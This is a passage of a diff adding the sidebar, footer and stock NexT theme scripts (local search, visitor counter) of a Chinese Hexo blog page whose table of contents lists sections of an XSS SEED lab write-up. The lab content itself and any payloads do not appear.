+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="httPs://www.google.com" title="google" target="_blank">google</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#跨站脚本攻击（Cross-Site-Scripting）"><span class="nav-number">1.</span> <span class="nav-text">跨站脚本攻击（Cross Site Scripting）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#概念"><span class="nav-number">1.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反射型XSS"><span class="nav-number">1.2.</span> <span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#储存型XSS"><span class="nav-number">1.3.</span> <span class="nav-text">储存型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM型XSS"><span class="nav-number">1.4.</span> <span class="nav-text">DOM型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#危害"><span class="nav-number">1.5.</span> <span class="nav-text">危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#seedlabs-XSS-相关内容"><span class="nav-number">1.6.</span> <span class="nav-text">seedlabs-XSS 相关内容</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Tasks"><span class="nav-number">1.7.</span> <span class="nav-text">Lab Tasks</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Task1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><span class="nav-number">1.7.1.</span> <span class="nav-text">Task1: Posting a Malicious Message to Display an Alert Window</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Task2-Posting-a-Malicious-Message-to-Display-Cookies"><span class="nav-number">1.7.2.</span> <span class="nav-text">Task2: Posting a Malicious Message to Display Cookies</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><span class="nav-number">1.8.</span> <span class="nav-text">Task 3: Stealing Cookies from the Victim’s Machine</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task-4-Becoming-the-Victim’s-Friend"><span class="nav-number">1.9.</span> <span class="nav-text">Task 4: Becoming the Victim’s Friend</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task-5-Modifying-the-Victim’s-Profile"><span class="nav-number">1.10.</span> <span class="nav-text">Task 5: Modifying the Victim’s Profile</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task-6-Writing-a-Self-Propagating-XSS-Worm"><span class="nav-number">1.11.</span> <span class="nav-text">Task 6: Writing a Self-Propagating XSS Worm</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task-7-Countermeasures"><span class="nav-number">1.12.</span> <span class="nav-text">Task 7: Countermeasures</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#游览器解码过程"><span class="nav-number">1.12.1.</span> <span class="nav-text">游览器解码过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HTML编码与解析"><span class="nav-number">1.12.2.</span> <span class="nav-text">HTML编码与解析</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">失神我醉了</span>
+<!--
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">10.6k</span>
+  
+-->
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+<!--
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+-->
+
+
+<span class="post-meta-divider">|</span>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共10.6k字</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>访问数：
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>访问量：
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" color="0,255,255" opacity="0.9" zindex="-2" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+</body>
+</html>
